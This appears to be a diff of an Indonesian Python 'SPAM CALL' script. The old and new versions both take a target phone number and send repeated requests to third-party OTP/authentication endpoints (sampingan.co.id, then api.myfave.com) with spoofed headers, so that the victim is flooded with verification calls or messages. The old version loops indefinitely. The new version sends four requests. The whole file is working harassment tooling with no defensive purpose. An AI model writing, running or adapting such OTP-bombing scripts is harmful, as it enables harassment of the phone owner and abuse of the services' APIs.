@@ -1,56 +1,38 @@
-import os,sys,time,requests,re,json,random
-def baner():
-    os.system("clear")
-time.sleep(1)
-print ("[!] Loading Cuk. . .")
-time.sleep(1)
-print ("Orang sabar disayang tuhan:)")
-time.sleep(10)
+import os,sys,time,requests,json
+from requests import post
+def balik():
+    f = input("\033[1;97mKEMBALI (y/t): \033[1;92m")
+    if f == "y":
+       os.system("python call.py")
+    elif f == "t":
+         sys.exit("\033[1;91mexit\033[1;97m")
 os.system("clear")
-    print ("""
-\t\033[1;97mSPAM CALL VERSION 5
-\t\033[90m------------------------------------------
-\033[1;97m[\033[1;94m•\033[1;97m]Author :\033[1;92mMR.GRIMX72
-\033[1;97m[\033[1;94m•\033[1;97m]Github :\033[4;92mgithub.com/candranovan\033[00m
-\033[90m------------------------------------------""")
-def countdownTimer(start_minute, start_second):
-    total_second = start_minute * 60 + start_second
-    while total_second:
-        mins, secs = divmod(total_second, 60)
-        print(f'\r\033[1;97m[\033[1;96m[!] \033[1;97m]Waiting\033[90m...\033[1;97m{mins:02d}:{secs:02d}', end='', flush=True)
-        time.sleep(1)
-        total_second -= 1
-def call():
-    ua={
-    "Content-Type": "application/json",
-    "Host": "srv3.sampingan.co.id",
-    "Connection": "Keep-Alive",
-    "Accept-Encoding": "gzip",
-    "User-Agent": "okhttp/4.4.0"
-    }
-    dat=json.dumps({"countryCode":"+62","phoneNumber":no})
-    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
-    if "Nomor tidak valid, cek kembali pengisian nomor anda" in r.text:
-        sys.exit("\033[1;97m[\033[1;91m×\033[1;97m]\033[1;91mFailed!!\033[00m")
+print ("\tSPAM CALL V4.0")
+print ("      Coded: \033[1;96mMR.GRIMX72\033[1;97m")
+print ("\033[1;97m*     Github:\033[1;92m github.com/candranovan\033[1;97m      *")
+print()
+print ("\033[90m>\033[1;97m CONTOH: \033[1;92m+62857×××××××××")
+no = input("\033[90m> \033[1;97mNOMOR TARGET: \033[1;92m")
+
+ua = {
+"Host": "api.myfave.com",
+"Connection": "keep-alive",
+"x-user-agent": "Fave-PWA/v1.0.0",
+"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
+"content-type": "application/json",
+"Accept": "*/*",
+"Origin": "https://m.myfave.com",
+"Referer": "https://m.myfave.com/jakarta/auth",
+"Accept-Encoding": "gzip, deflate, br",
+"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+}
+for i in range(1,5):
+    dat = {"phone":no}
+    r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
+    if "6c047709f9da4291a568fa84b97b6d47" in r:
+        print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mFAILED")
     else:
-        print (f"\033[1;97m[\033[1;92m+\033[1;97m]Spam To \033[90m-\033[1;94m{no}\033[90m- \033[1;92mSuccess\033[1;97m[\033[1;92m+\033[1;97m]")
-if __name__=="__main__":
-     try:
-         baner()
-         print ("\033[1;97m[\033[1;94m#\033[1;97m]CONTOH: \033[1;94m896×××××××")
-         no=input("\033[1;97m[\033[1;92m+\033[1;97m]NO TARGET: \033[1;94m")
-         load="\033[1;91m..."
-         for x in range(1,101):
-             time.sleep(1./20)
-             print (f"\r\033[1;97m[\033[1;96m!\033[1;97m]Loading{load}\033[1;92m{x}\033[1;97m%", end='', flush=True)
-         while True:
-              print ("\r\n")
-              call()
-              countdownTimer(1, 00)
-              print ("\r")
-     except requests.exceptions.ConnectionError:
-               sys.exit("\033[1;97m[\033[1;91m×\033[1;97m\033[1;91mKoneksi Error!!")
-     except KeyError:
-               sys.exit()
-     except KeyboardInterrupt:
-               sys.exit()
+        print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mSUCCESS")
+    time.sleep(100)
+
+balik()
